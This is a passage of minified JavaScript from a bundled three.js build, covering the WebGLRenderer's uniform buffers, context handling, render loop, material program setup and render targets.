a=t.isWebGL2?i.getParameter(i.MAX_UNIFORM_BUFFER_BINDINGS):0;function l(g,_){const v=_.program;n.uniformBlockBinding(g,v)}function d(g,_){let v=r[g.id];v===void 0&&(E(g),v=u(g),r[g.id]=v,g.addEventListener("dispose",f));const w=_.program;n.updateUBOMapping(g,w);const M=e.render.frame;s[g.id]!==M&&(p(g),s[g.id]=M)}function u(g){const _=h();g.__bindingPointIndex=_;const v=i.createBuffer(),w=g.__size,M=g.usage;return i.bindBuffer(i.UNIFORM_BUFFER,v),i.bufferData(i.UNIFORM_BUFFER,w,M),i.bindBuffer(i.UNIFORM_BUFFER,null),i.bindBufferBase(i.UNIFORM_BUFFER,_,v),v}function h(){for(let g=0;g<a;g++)if(o.indexOf(g)===-1)return o.push(g),g;return console.error("THREE.WebGLRenderer: Maximum number of simultaneously usable uniforms groups reached."),0}function p(g){const _=r[g.id],v=g.uniforms,w=g.__cache;i.bindBuffer(i.UNIFORM_BUFFER,_);for(let M=0,T=v.length;M<T;M++){const D=Array.isArray(v[M])?v[M]:[v[M]];for(let y=0,R=D.length;y<R;y++){const k=D[y];if(m(k,M,y,w)===!0){const X=k.__offset,te=Array.isArray(k.value)?k.value:[k.value];let P=0;for(let z=0;z<te.length;z++){const W=te[z],Y=x(W);typeof W=="number"||typeof W=="boolean"?(k.__data[0]=W,i.bufferSubData(i.UNIFORM_BUFFER,X+P,k.__data)):W.isMatrix3?(k.__data[0]=W.elements[0],k.__data[1]=W.elements[1],k.__data[2]=W.elements[2],k.__data[3]=0,k.__data[4]=W.elements[3],k.__data[5]=W.elements[4],k.__data[6]=W.elements[5],k.__data[7]=0,k.__data[8]=W.elements[6],k.__data[9]=W.elements[7],k.__data[10]=W.elements[8],k.__data[11]=0):(W.toArray(k.__data,P),P+=Y.storage/Float32Array.BYTES_PER_ELEMENT)}i.bufferSubData(i.UNIFORM_BUFFER,X,k.__data)}}}i.bindBuffer(i.UNIFORM_BUFFER,null)}function m(g,_,v,w){const M=g.value,T=_+"_"+v;if(w[T]===void 0)return typeof M=="number"||typeof M=="boolean"?w[T]=M:w[T]=M.clone(),!0;{const D=w[T];if(typeof M=="number"||typeof M=="boolean"){if(D!==M)return w[T]=M,!0}else if(D.equals(M)===!1)return D.copy(M),!0}return!1}function E(g){const _=g.uniforms;let v=0;const w=16;for(let T=0,D=_.length;T<D;T++){const y=Array.isArray(_[T])?_[T]:[_[T]];for(let R=0,k=y.length;R<k;R++){const X=y[R],te=Array.isArray(X.value)?X.value:[X.value];for(let P=0,z=te.length;P<z;P++){const W=te[P],Y=x(W),H=v%w;H!==0&&w-H<Y.boundary&&(v+=w-H),X.__data=new Float32Array(Y.storage/Float32Array.BYTES_PER_ELEMENT),X.__offset=v,v+=Y.storage}}}const M=v%w;return M>0&&(v+=w-M),g.__size=v,g.__cache={},this}function x(g){const _={boundary:0,storage:0};return typeof g=="number"||typeof g=="boolean"?(_.boundary=4,_.storage=4):g.isVector2?(_.boundary=8,_.storage=8):g.isVector3||g.isColor?(_.boundary=16,_.storage=12):g.isVector4?(_.boundary=16,_.storage=16):g.isMatrix3?(_.boundary=48,_.storage=48):g.isMatrix4?(_.boundary=64,_.storage=64):g.isTexture?console.warn("THREE.WebGLRenderer: Texture samplers can not be part of an uniforms group."):console.warn("THREE.WebGLRenderer: Unsupported uniform value type.",g),_}function f(g){const _=g.target;_.removeEventListener("dispose",f);const v=o.indexOf(_.__bindingPointIndex);o.splice(v,1),i.deleteBuffer(r[_.id]),delete r[_.id],delete s[_.id]}function c(){for(const g in r)i.deleteBuffer(r[g]);o=[],r={},s={}}return{bind:l,update:d,dispose:c}}class Io{constructor(e={}){const{canvas:t=Hl(),context:n=null,depth:r=!0,stencil:s=!0,alpha:o=!1,antialias:a=!1,premultipliedAlpha:l=!0,preserveDrawingBuffer:d=!1,powerPreference:u="default",failIfMajorPerformanceCaveat:h=!1}=e;this.isWebGLRenderer=!0;let p;n!==null?p=n.getContextAttributes().alpha:p=o;const m=new Uint32Array(4),E=new Int32Array(4);let x=null,f=null;const c=[],g=[];this.domElement=t,this.debug={checkShaderErrors:!0,onShaderError:null},this.autoClear=!0,this.autoClearColor=!0,this.autoClearDepth=!0,this.autoClearStencil=!0,this.sortObjects=!0,this.clippingPlanes=[],this.localClippingEnabled=!1,this._outputColorSpace=lt,this._useLegacyLights=!1,this.toneMapping=on,this.toneMappingExposure=1;const _=this;let v=!1,w=0,M=0,T=null,D=-1,y=null;const R=new ct,k=new ct;let X=null;const te=new He(0);let P=0,z=t.width,W=t.height,Y=1,H=null,V=null;const q=new ct(0,0,z,W),Q=new ct(0,0,z,W);let $=!1;const G=new Mo;let j=!1,re=!1,pe=null;const ue=new Ze,Me=new Be,Te=new L,ge={background:null,fog:null,environment:null,overrideMaterial:null,isScene:!0};function Oe(){return T===null?Y:1}let N=n;function nt(b,I){for(let F=0;F<b.length;F++){const B=b[F],O=t.getContext(B,I);if(O!==null)return O}return null}try{const b={alpha:!0,depth:r,stencil:s,antialias:a,premultipliedAlpha:l,preserveDrawingBuffer:d,powerPreference:u,failIfMajorPerformanceCaveat:h};if("setAttribute"in t&&t.setAttribute("data-engine",`three.js r${ss}`),t.addEventListener("webglcontextlost",ne,!1),t.addEventListener("webglcontextrestored",C,!1),t.addEventListener("webglcontextcreationerror",se,!1),N===null){const I=["webgl2","webgl","experimental-webgl"];if(_.isWebGL1Renderer===!0&&I.shift(),N=nt(I,b),N===null)throw nt(I)?new Error("Error creating WebGL context with your selected attributes."):new Error("Error creating WebGL context.")}typeof WebGLRenderingContext<"u"&&N instanceof WebGLRenderingContext&&console.warn("THREE.WebGLRenderer: WebGL 1 support was deprecated in r153 and will be removed in r163."),N.getShaderPrecisionFormat===void 0&&(N.getShaderPrecisionFormat=function(){return{rangeMin:1,rangeMax:1,precision:1}})}catch(b){throw console.error("THREE.WebGLRenderer: "+b.message),b}let ve,Re,fe,Ke,Le,A,S,U,J,Z,ee,he,oe,ce,ye,De,K,Ve,ze,Ae,_e,de,Pe,Ge;function Qe(){ve=new ip(N),Re=new $u(N,ve,e),ve.init(Re),de=new Vf(N,ve,Re),fe=new Gf(N,ve,Re),Ke=new ap(N),Le=new Rf,A=new Hf(N,ve,fe,Le,Re,de,Ke),S=new Qu(_),U=new np(_),J=new fc(N,Re),Pe=new ju(N,ve,J,Re),Z=new rp(N,J,Ke,Pe),ee=new dp(N,Z,J,Ke),ze=new cp(N,Re,A),De=new Zu(Le),he=new Af(_,S,U,ve,Re,Pe,De),oe=new Yf(_,Le),ce=new Cf,ye=new Of(ve,Re),Ve=new Yu(_,S,U,fe,ee,p,l),K=new Bf(_,ee,Re),Ge=new jf(N,Ke,Re,fe),Ae=new Ku(N,ve,Ke,Re),_e=new sp(N,ve,Ke,Re),Ke.programs=he.programs,_.capabilities=Re,_.extensions=ve,_.properties=Le,_.renderLists=ce,_.shadowMap=K,_.state=fe,_.info=Ke}Qe();const Ue=new qf(_,N);this.xr=Ue,this.getContext=function(){return N},this.getContextAttributes=function(){return N.getContextAttributes()},this.forceContextLoss=function(){const b=ve.get("WEBGL_lose_context");b&&b.loseContext()},this.forceContextRestore=function(){const b=ve.get("WEBGL_lose_context");b&&b.restoreContext()},this.getPixelRatio=function(){return Y},this.setPixelRatio=function(b){b!==void 0&&(Y=b,this.setSize(z,W,!1))},this.getSize=function(b){return b.set(z,W)},this.setSize=function(b,I,F=!0){if(Ue.isPresenting){console.warn("THREE.WebGLRenderer: Can't change size while VR device is presenting.");return}z=b,W=I,t.width=Math.floor(b*Y),t.height=Math.floor(I*Y),F===!0&&(t.style.width=b+"px",t.style.height=I+"px"),this.setViewport(0,0,b,I)},this.getDrawingBufferSize=function(b){return b.set(z*Y,W*Y).floor()},this.setDrawingBufferSize=function(b,I,F){z=b,W=I,Y=F,t.width=Math.floor(b*F),t.height=Math.floor(I*F),this.setViewport(0,0,b,I)},this.getCurrentViewport=function(b){return b.copy(R)},this.getViewport=function(b){return b.copy(q)},this.setViewport=function(b,I,F,B){b.isVector4?q.set(b.x,b.y,b.z,b.w):q.set(b,I,F,B),fe.viewport(R.copy(q).multiplyScalar(Y).floor())},this.getScissor=function(b){return b.copy(Q)},this.setScissor=function(b,I,F,B){b.isVector4?Q.set(b.x,b.y,b.z,b.w):Q.set(b,I,F,B),fe.scissor(k.copy(Q).multiplyScalar(Y).floor())},this.getScissorTest=function(){return $},this.setScissorTest=function(b){fe.setScissorTest($=b)},this.setOpaqueSort=function(b){H=b},this.setTransparentSort=function(b){V=b},this.getClearColor=function(b){return b.copy(Ve.getClearColor())},this.setClearColor=function(){Ve.setClearColor.apply(Ve,arguments)},this.getClearAlpha=function(){return Ve.getClearAlpha()},this.setClearAlpha=function(){Ve.setClearAlpha.apply(Ve,arguments)},this.clear=function(b=!0,I=!0,F=!0){let B=0;if(b){let O=!1;if(T!==null){const le=T.texture.format;O=le===lo||le===oo||le===ao}if(O){const le=T.texture.type,me=le===ln||le===rn||le===as||le===yn||le===ro||le===so,Ee=Ve.getClearColor(),be=Ve.getClearAlpha(),Ne=Ee.r,we=Ee.g,Ce=Ee.b;me?(m[0]=Ne,m[1]=we,m[2]=Ce,m[3]=be,N.clearBufferuiv(N.COLOR,0,m)):(E[0]=Ne,E[1]=we,E[2]=Ce,E[3]=be,N.clearBufferiv(N.COLOR,0,E))}else B|=N.COLOR_BUFFER_BIT}I&&(B|=N.DEPTH_BUFFER_BIT),F&&(B|=N.STENCIL_BUFFER_BIT,this.state.buffers.stencil.setMask(4294967295)),N.clear(B)},this.clearColor=function(){this.clear(!0,!1,!1)},this.clearDepth=function(){this.clear(!1,!0,!1)},this.clearStencil=function(){this.clear(!1,!1,!0)},this.dispose=function(){t.removeEventListener("webglcontextlost",ne,!1),t.removeEventListener("webglcontextrestored",C,!1),t.removeEventListener("webglcontextcreationerror",se,!1),ce.dispose(),ye.dispose(),Le.dispose(),S.dispose(),U.dispose(),ee.dispose(),Pe.dispose(),Ge.dispose(),he.dispose(),Ue.dispose(),Ue.removeEventListener("sessionstart",ht),Ue.removeEventListener("sessionend",Ye),pe&&(pe.dispose(),pe=null),mt.stop()};function ne(b){b.preventDefault(),console.log("THREE.WebGLRenderer: Context Lost."),v=!0}function C(){console.log("THREE.WebGLRenderer: Context Restored."),v=!1;const b=Ke.autoReset,I=K.enabled,F=K.autoUpdate,B=K.needsUpdate,O=K.type;Qe(),Ke.autoReset=b,K.enabled=I,K.autoUpdate=F,K.needsUpdate=B,K.type=O}function se(b){console.error("THREE.WebGLRenderer: A WebGL context could not be created. Reason: ",b.statusMessage)}function ae(b){const I=b.target;I.removeEventListener("dispose",ae),Se(I)}function Se(b){xe(b),Le.remove(b)}function xe(b){const I=Le.get(b).programs;I!==void 0&&(I.forEach(function(F){he.releaseProgram(F)}),b.isShaderMaterial&&he.releaseShaderCache(b))}this.renderBufferDirect=function(b,I,F,B,O,le){I===null&&(I=ge);const me=O.isMesh&&O.matrixWorld.determinant()<0,Ee=Fo(b,I,F,B,O);fe.setMaterial(B,me);let be=F.index,Ne=1;if(B.wireframe===!0){if(be=Z.getWireframeAttribute(F),be===void 0)return;Ne=2}const we=F.drawRange,Ce=F.attributes.position;let et=we.start*Ne,St=(we.start+we.count)*Ne;le!==null&&(et=Math.max(et,le.start*Ne),St=Math.min(St,(le.start+le.count)*Ne)),be!==null?(et=Math.max(et,0),St=Math.min(St,be.count)):Ce!=null&&(et=Math.max(et,0),St=Math.min(St,Ce.count));const at=St-et;if(at<0||at===1/0)return;Pe.setup(O,B,Ee,F,be);let Vt,$e=Ae;if(be!==null&&(Vt=J.get(be),$e=_e,$e.setIndex(Vt)),O.isMesh)B.wireframe===!0?(fe.setLineWidth(B.wireframeLinewidth*Oe()),$e.setMode(N.LINES)):$e.setMode(N.TRIANGLES);else if(O.isLine){let Fe=B.linewidth;Fe===void 0&&(Fe=1),fe.setLineWidth(Fe*Oe()),O.isLineSegments?$e.setMode(N.LINES):O.isLineLoop?$e.setMode(N.LINE_LOOP):$e.setMode(N.LINE_STRIP)}else O.isPoints?$e.setMode(N.POINTS):O.isSprite&&$e.setMode(N.TRIANGLES);if(O.isBatchedMesh)$e.renderMultiDraw(O._multiDrawStarts,O._multiDrawCounts,O._multiDrawCount);else if(O.isInstancedMesh)$e.renderInstances(et,at,O.count);else if(F.isInstancedBufferGeometry){const Fe=F._maxInstanceCount!==void 0?F._maxInstanceCount:1/0,ar=Math.min(F.instanceCount,Fe);$e.renderInstances(et,at,ar)}else $e.render(et,at)};function Xe(b,I,F){b.transparent===!0&&b.side===Ut&&b.forceSinglePass===!1?(b.side=Et,b.needsUpdate=!0,Ei(b,I,F),b.side=cn,b.needsUpdate=!0,Ei(b,I,F),b.side=Ut):Ei(b,I,F)}this.compile=function(b,I,F=null){F===null&&(F=b),f=ye.get(F),f.init(),g.push(f),F.traverseVisible(function(O){O.isLight&&O.layers.test(I.layers)&&(f.pushLight(O),O.castShadow&&f.pushShadow(O))}),b!==F&&b.traverseVisible(function(O){O.isLight&&O.layers.test(I.layers)&&(f.pushLight(O),O.castShadow&&f.pushShadow(O))}),f.setupLights(_._useLegacyLights);const B=new Set;return b.traverse(function(O){const le=O.material;if(le)if(Array.isArray(le))for(let me=0;me<le.length;me++){const Ee=le[me];Xe(Ee,F,O),B.add(Ee)}else Xe(le,F,O),B.add(le)}),g.pop(),f=null,B},this.compileAsync=function(b,I,F=null){const B=this.compile(b,I,F);return new Promise(O=>{function le(){if(B.forEach(function(me){Le.get(me).currentProgram.isReady()&&B.delete(me)}),B.size===0){O(b);return}setTimeout(le,10)}ve.get("KHR_parallel_shader_compile")!==null?le():setTimeout(le,10)})};let qe=null;function st(b){qe&&qe(b)}function ht(){mt.stop()}function Ye(){mt.start()}const mt=new bo;mt.setAnimationLoop(st),typeof self<"u"&&mt.setContext(self),this.setAnimationLoop=function(b){qe=b,Ue.setAnimationLoop(b),b===null?mt.stop():mt.start()},Ue.addEventListener("sessionstart",ht),Ue.addEventListener("sessionend",Ye),this.render=function(b,I){if(I!==void 0&&I.isCamera!==!0){console.error("THREE.WebGLRenderer.render: camera is not an instance of THREE.Camera.");return}if(v===!0)return;b.matrixWorldAutoUpdate===!0&&b.updateMatrixWorld(),I.parent===null&&I.matrixWorldAutoUpdate===!0&&I.updateMatrixWorld(),Ue.enabled===!0&&Ue.isPresenting===!0&&(Ue.cameraAutoUpdate===!0&&Ue.updateCamera(I),I=Ue.getCamera()),b.isScene===!0&&b.onBeforeRender(_,b,I,T),f=ye.get(b,g.length),f.init(),g.push(f),ue.multiplyMatrices(I.projectionMatrix,I.matrixWorldInverse),G.setFromProjectionMatrix(ue),re=this.localClippingEnabled,j=De.init(this.clippingPlanes,re),x=ce.get(b,c.length),x.init(),c.push(x),Bt(b,I,0,_.sortObjects),x.finish(),_.sortObjects===!0&&x.sort(H,V),this.info.render.frame++,j===!0&&De.beginShadows();const F=f.state.shadowsArray;if(K.render(F,b,I),j===!0&&De.endShadows(),this.info.autoReset===!0&&this.info.reset(),Ve.render(x,b),f.setupLights(_._useLegacyLights),I.isArrayCamera){const B=I.cameras;for(let O=0,le=B.length;O<le;O++){const me=B[O];hs(x,b,me,me.viewport)}}else hs(x,b,I);T!==null&&(A.updateMultisampleRenderTarget(T),A.updateRenderTargetMipmap(T)),b.isScene===!0&&b.onAfterRender(_,b,I),Pe.resetDefaultState(),D=-1,y=null,g.pop(),g.length>0?f=g[g.length-1]:f=null,c.pop(),c.length>0?x=c[c.length-1]:x=null};function Bt(b,I,F,B){if(b.visible===!1)return;if(b.layers.test(I.layers)){if(b.isGroup)F=b.renderOrder;else if(b.isLOD)b.autoUpdate===!0&&b.update(I);else if(b.isLight)f.pushLight(b),b.castShadow&&f.pushShadow(b);else if(b.isSprite){if(!b.frustumCulled||G.intersectsSprite(b)){B&&Te.setFromMatrixPosition(b.matrixWorld).applyMatrix4(ue);const me=ee.update(b),Ee=b.material;Ee.visible&&x.push(b,me,Ee,F,Te.z,null)}}else if((b.isMesh||b.isLine||b.isPoints)&&(!b.frustumCulled||G.intersectsObject(b))){const me=ee.update(b),Ee=b.material;if(B&&(b.boundingSphere!==void 0?(b.boundingSphere===null&&b.computeBoundingSphere(),Te.copy(b.boundingSphere.center)):(me.boundingSphere===null&&me.computeBoundingSphere(),Te.copy(me.boundingSphere.center)),Te.applyMatrix4(b.matrixWorld).applyMatrix4(ue)),Array.isArray(Ee)){const be=me.groups;for(let Ne=0,we=be.length;Ne<we;Ne++){const Ce=be[Ne],et=Ee[Ce.materialIndex];et&&et.visible&&x.push(b,me,et,F,Te.z,Ce)}}else Ee.visible&&x.push(b,me,Ee,F,Te.z,null)}}const le=b.children;for(let me=0,Ee=le.length;me<Ee;me++)Bt(le[me],I,F,B)}function hs(b,I,F,B){const O=b.opaque,le=b.transmissive,me=b.transparent;f.setupLightsView(F),j===!0&&De.setGlobalState(_.clippingPlanes,F),le.length>0&&Uo(O,le,I,F),B&&fe.viewport(R.copy(B)),O.length>0&&xi(O,I,F),le.length>0&&xi(le,I,F),me.length>0&&xi(me,I,F),fe.buffers.depth.setTest(!0),fe.buffers.depth.setMask(!0),fe.buffers.color.setMask(!0),fe.setPolygonOffset(!1)}function Uo(b,I,F,B){if((F.isScene===!0?F.overrideMaterial:null)!==null)return;const le=Re.isWebGL2;pe===null&&(pe=new Tn(1,1,{generateMipmaps:!0,type:ve.has("EXT_color_buffer_half_float")?hi:ln,minFilter:fi,samples:le?4:0})),_.getDrawingBufferSize(Me),le?pe.setSize(Me.x,Me.y):pe.setSize(ts(Me.x),ts(Me.y));const me=_.getRenderTarget();_.setRenderTarget(pe),_.getClearColor(te),P=_.getClearAlpha(),P<1&&_.setClearColor(16777215,.5),_.clear();const Ee=_.toneMapping;_.toneMapping=on,xi(b,F,B),A.updateMultisampleRenderTarget(pe),A.updateRenderTargetMipmap(pe);let be=!1;for(let Ne=0,we=I.length;Ne<we;Ne++){const Ce=I[Ne],et=Ce.object,St=Ce.geometry,at=Ce.material,Vt=Ce.group;if(at.side===Ut&&et.layers.test(B.layers)){const $e=at.side;at.side=Et,at.needsUpdate=!0,ms(et,F,B,St,at,Vt),at.side=$e,at.needsUpdate=!0,be=!0}}be===!0&&(A.updateMultisampleRenderTarget(pe),A.updateRenderTargetMipmap(pe)),_.setRenderTarget(me),_.setClearColor(te,P),_.toneMapping=Ee}function xi(b,I,F){const B=I.isScene===!0?I.overrideMaterial:null;for(let O=0,le=b.length;O<le;O++){const me=b[O],Ee=me.object,be=me.geometry,Ne=B===null?me.material:B,we=me.group;Ee.layers.test(F.layers)&&ms(Ee,I,F,be,Ne,we)}}function ms(b,I,F,B,O,le){b.onBeforeRender(_,I,F,B,O,le),b.modelViewMatrix.multiplyMatrices(F.matrixWorldInverse,b.matrixWorld),b.normalMatrix.getNormalMatrix(b.modelViewMatrix),O.onBeforeRender(_,I,F,B,b,le),O.transparent===!0&&O.side===Ut&&O.forceSinglePass===!1?(O.side=Et,O.needsUpdate=!0,_.renderBufferDirect(F,I,B,O,b,le),O.side=cn,O.needsUpdate=!0,_.renderBufferDirect(F,I,B,O,b,le),O.side=Ut):_.renderBufferDirect(F,I,B,O,b,le),b.onAfterRender(_,I,F,B,O,le)}function Ei(b,I,F){I.isScene!==!0&&(I=ge);const B=Le.get(b),O=f.state.lights,le=f.state.shadowsArray,me=O.state.version,Ee=he.getParameters(b,O.state,le,I,F),be=he.getProgramCacheKey(Ee);let Ne=B.programs;B.environment=b.isMeshStandardMaterial?I.environment:null,B.fog=I.fog,B.envMap=(b.isMeshStandardMaterial?U:S).get(b.envMap||B.environment),Ne===void 0&&(b.addEventListener("dispose",ae),Ne=new Map,B.programs=Ne);let we=Ne.get(be);if(we!==void 0){if(B.currentProgram===we&&B.lightsStateVersion===me)return gs(b,Ee),we}else Ee.uniforms=he.getUniforms(b),b.onBuild(F,Ee,_),b.onBeforeCompile(Ee,_),we=he.acquireProgram(Ee,be),Ne.set(be,we),B.uniforms=Ee.uniforms;const Ce=B.uniforms;return(!b.isShaderMaterial&&!b.isRawShaderMaterial||b.clipping===!0)&&(Ce.clippingPlanes=De.uniform),gs(b,Ee),B.needsLights=zo(b),B.lightsStateVersion=me,B.needsLights&&(Ce.ambientLightColor.value=O.state.ambient,Ce.lightProbe.value=O.state.probe,Ce.directionalLights.value=O.state.directional,Ce.directionalLightShadows.value=O.state.directionalShadow,Ce.spotLights.value=O.state.spot,Ce.spotLightShadows.value=O.state.spotShadow,Ce.rectAreaLights.value=O.state.rectArea,Ce.ltc_1.value=O.state.rectAreaLTC1,Ce.ltc_2.value=O.state.rectAreaLTC2,Ce.pointLights.value=O.state.point,Ce.pointLightShadows.value=O.state.pointShadow,Ce.hemisphereLights.value=O.state.hemi,Ce.directionalShadowMap.value=O.state.directionalShadowMap,Ce.directionalShadowMatrix.value=O.state.directionalShadowMatrix,Ce.spotShadowMap.value=O.state.spotShadowMap,Ce.spotLightMatrix.value=O.state.spotLightMatrix,Ce.spotLightMap.value=O.state.spotLightMap,Ce.pointShadowMap.value=O.state.pointShadowMap,Ce.pointShadowMatrix.value=O.state.pointShadowMatrix),B.currentProgram=we,B.uniformsList=null,we}function _s(b){if(b.uniformsList===null){const I=b.currentProgram.getUniforms();b.uniformsList=qi.seqWithValue(I.seq,b.uniforms)}return b.uniformsList}function gs(b,I){const F=Le.get(b);F.outputColorSpace=I.outputColorSpace,F.batching=I.batching,F.instancing=I.instancing,F.instancingColor=I.instancingColor,F.skinning=I.skinning,F.morphTargets=I.morphTargets,F.morphNormals=I.morphNormals,F.morphColors=I.morphColors,F.morphTargetsCount=I.morphTargetsCount,F.numClippingPlanes=I.numClippingPlanes,F.numIntersection=I.numClipIntersection,F.vertexAlphas=I.vertexAlphas,F.vertexTangents=I.vertexTangents,F.toneMapping=I.toneMapping}function Fo(b,I,F,B,O){I.isScene!==!0&&(I=ge),A.resetTextureUnits();const le=I.fog,me=B.isMeshStandardMaterial?I.environment:null,Ee=T===null?_.outputColorSpace:T.isXRRenderTarget===!0?T.texture.colorSpace:Zt,be=(B.isMeshStandardMaterial?U:S).get(B.envMap||me),Ne=B.vertexColors===!0&&!!F.attributes.color&&F.attributes.color.itemSize===4,we=!!F.attributes.tangent&&(!!B.normalMap||B.anisotropy>0),Ce=!!F.morphAttributes.position,et=!!F.morphAttributes.normal,St=!!F.morphAttributes.color;let at=on;B.toneMapped&&(T===null||T.isXRRenderTarget===!0)&&(at=_.toneMapping);const Vt=F.morphAttributes.position||F.morphAttributes.normal||F.morphAttributes.color,$e=Vt!==void 0?Vt.length:0,Fe=Le.get(B),ar=f.state.lights;if(j===!0&&(re===!0||b!==y)){const At=b===y&&B.id===D;De.setState(B,b,At)}let Je=!1;B.version===Fe.__version?(Fe.needsLights&&Fe.lightsStateVersion!==ar.state.version||Fe.outputColorSpace!==Ee||O.isBatchedMesh&&Fe.batching===!1||!O.isBatchedMesh&&Fe.batching===!0||O.isInstancedMesh&&Fe.instancing===!1||!O.isInstancedMesh&&Fe.instancing===!0||O.isSkinnedMesh&&Fe.skinning===!1||!O.isSkinnedMesh&&Fe.skinning===!0||O.isInstancedMesh&&Fe.instancingColor===!0&&O.instanceColor===null||O.isInstancedMesh&&Fe.instancingColor===!1&&O.instanceColor!==null||Fe.envMap!==be||B.fog===!0&&Fe.fog!==le||Fe.numClippingPlanes!==void 0&&(Fe.numClippingPlanes!==De.numPlanes||Fe.numIntersection!==De.numIntersection)||Fe.vertexAlphas!==Ne||Fe.vertexTangents!==we||Fe.morphTargets!==Ce||Fe.morphNormals!==et||Fe.morphColors!==St||Fe.toneMapping!==at||Re.isWebGL2===!0&&Fe.morphTargetsCount!==$e)&&(Je=!0):(Je=!0,Fe.__version=B.version);let dn=Fe.currentProgram;Je===!0&&(dn=Ei(B,I,O));let vs=!1,ni=!1,or=!1;const ut=dn.getUniforms(),un=Fe.uniforms;if(fe.useProgram(dn.program)&&(vs=!0,ni=!0,or=!0),B.id!==D&&(D=B.id,ni=!0),vs||y!==b){ut.setValue(N,"projectionMatrix",b.projectionMatrix),ut.setValue(N,"viewMatrix",b.matrixWorldInverse);const At=ut.map.cameraPosition;At!==void 0&&At.setValue(N,Te.setFromMatrixPosition(b.matrixWorld)),Re.logarithmicDepthBuffer&&ut.setValue(N,"logDepthBufFC",2/(Math.log(b.far+1)/Math.LN2)),(B.isMeshPhongMaterial||B.isMeshToonMaterial||B.isMeshLambertMaterial||B.isMeshBasicMaterial||B.isMeshStandardMaterial||B.isShaderMaterial)&&ut.setValue(N,"isOrthographic",b.isOrthographicCamera===!0),y!==b&&(y=b,ni=!0,or=!0)}if(O.isSkinnedMesh){ut.setOptional(N,O,"bindMatrix"),ut.setOptional(N,O,"bindMatrixInverse");const At=O.skeleton;At&&(Re.floatVertexTextures?(At.boneTexture===null&&At.computeBoneTexture(),ut.setValue(N,"boneTexture",At.boneTexture,A)):console.warn("THREE.WebGLRenderer: SkinnedMesh can only be used with WebGL 2. With WebGL 1 OES_texture_float and vertex textures support is required."))}O.isBatchedMesh&&(ut.setOptional(N,O,"batchingTexture"),ut.setValue(N,"batchingTexture",O._matricesTexture,A));const lr=F.morphAttributes;if((lr.position!==void 0||lr.normal!==void 0||lr.color!==void 0&&Re.isWebGL2===!0)&&ze.update(O,F,dn),(ni||Fe.receiveShadow!==O.receiveShadow)&&(Fe.receiveShadow=O.receiveShadow,ut.setValue(N,"receiveShadow",O.receiveShadow)),B.isMeshGouraudMaterial&&B.envMap!==null&&(un.envMap.value=be,un.flipEnvMap.value=be.isCubeTexture&&be.isRenderTargetTexture===!1?-1:1),ni&&(ut.setValue(N,"toneMappingExposure",_.toneMappingExposure),Fe.needsLights&&ko(un,or),le&&B.fog===!0&&oe.refreshFogUniforms(un,le),oe.refreshMaterialUniforms(un,B,Y,W,pe),qi.upload(N,_s(Fe),un,A)),B.isShaderMaterial&&B.uniformsNeedUpdate===!0&&(qi.upload(N,_s(Fe),un,A),B.uniformsNeedUpdate=!1),B.isSpriteMaterial&&ut.setValue(N,"center",O.center),ut.setValue(N,"modelViewMatrix",O.modelViewMatrix),ut.setValue(N,"normalMatrix",O.normalMatrix),ut.setValue(N,"modelMatrix",O.matrixWorld),B.isShaderMaterial||B.isRawShaderMaterial){const At=B.uniformsGroups;for(let cr=0,Bo=At.length;cr<Bo;cr++)if(Re.isWebGL2){const xs=At[cr];Ge.update(xs,dn),Ge.bind(xs,dn)}else console.warn("THREE.WebGLRenderer: Uniform Buffer Objects can only be used with WebGL 2.")}return dn}function ko(b,I){b.ambientLightColor.needsUpdate=I,b.lightProbe.needsUpdate=I,b.directionalLights.needsUpdate=I,b.directionalLightShadows.needsUpdate=I,b.pointLights.needsUpdate=I,b.pointLightShadows.needsUpdate=I,b.spotLights.needsUpdate=I,b.spotLightShadows.needsUpdate=I,b.rectAreaLights.needsUpdate=I,b.hemisphereLights.needsUpdate=I}function zo(b){return b.isMeshLambertMaterial||b.isMeshToonMaterial||b.isMeshPhongMaterial||b.isMeshStandardMaterial||b.isShadowMaterial||b.isShaderMaterial&&b.lights===!0}this.getActiveCubeFace=function(){return w},this.getActiveMipmapLevel=function(){return M},this.getRenderTarget=function(){return T},this.setRenderTargetTextures=function(b,I,F){Le.get(b.texture).__webglTexture=I,Le.get(b.depthTexture).__webglTexture=F;const B=Le.get(b);B.__hasExternalTextures=!0,B.__hasExternalTextures&&(B.__autoAllocateDepthBuffer=F===void 0,B.__autoAllocateDepthBuffer||ve.has("WEBGL_multisampled_render_to_texture")===!0&&(console.warn("THREE.WebGLRenderer: Render-to-texture extension was disabled because an external texture was provided"),B.__useRenderToTexture=!1))},this.setRenderTargetFramebuffer=function(b,I){const F=Le.get(b);F.__webglFramebuffer=I,F.__useDefaultFramebuffer=I===void 0},this.setRenderTarget=function(b,I=0,F=0){T=b,w=I,M=F;let B=!0,O=null,le=!1,me=!1;if(b){const be=Le.get(b);be.__useDefaultFramebuffer!==void 0?(fe.bindFramebuffer(N.FRAMEBUFFER,null),B=!1):be.__webglFramebuffer===void 0?A.setupRenderTarget(b):be.__hasExternalTextures&&A.rebindTextures(b,Le.get(b.texture).__webglTexture,Le.get(b.depthTexture).__webglTexture);const Ne=b.texture;(Ne.isData3DTexture||Ne.isDataArrayTexture||Ne.isCompressedArrayTexture)&&(me=!0);const we=Le.get(b).__webglFramebuffer;b.isWebGLCubeRenderTarget?(Array.isArray(we[I])?O=we[I][F]:O=we[I],le=!0):Re.isWebGL2&&b.samples>0&&A.useMultisampledRTT(b)===!1?O=Le.get(b).__webglMultisampledFramebuffer:Array.isArray(we)?O=we[F]:O=we,R.copy(b.viewport),k.copy(b.scissor),X=b.scissorTest}else R.copy(q).multiplyScalar(Y).floor(),k.copy(Q).multiplyScalar(Y).floor(),X=$;if(fe.bindFramebuffer(N.FRAMEBUFFER,O)&&Re.drawBuffers&&B&&fe.drawBuffers(b,O),fe.viewport(R),fe.scissor(k),fe.setScissorTest(X),le){const be=Le.get(b.texture);N.framebufferTexture2D(N.FRAMEBUFFER,N.COLOR_ATTACHMENT0,N.TEXTURE_CUBE_MAP_POSITIVE_X+I,be.__webglTexture,F)}else if(me){const be=Le.get(b.texture),Ne=I||0;N.framebufferTextureLayer(N.FRAMEBUFFER,N.COLOR_ATTACHMENT0,be.__webglTexture,F||0,Ne)}D=-1},this.readRenderTargetPixels=function(b,I,F,B,O,le,me){if(!(b&&b.isWebGLRenderTarget)){console.error("THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not THREE.WebGLRenderTarget.");return}let Ee=Le.get(b).__webglFramebuffer;if(b.isWebGLCubeRenderTarget&&me!==void 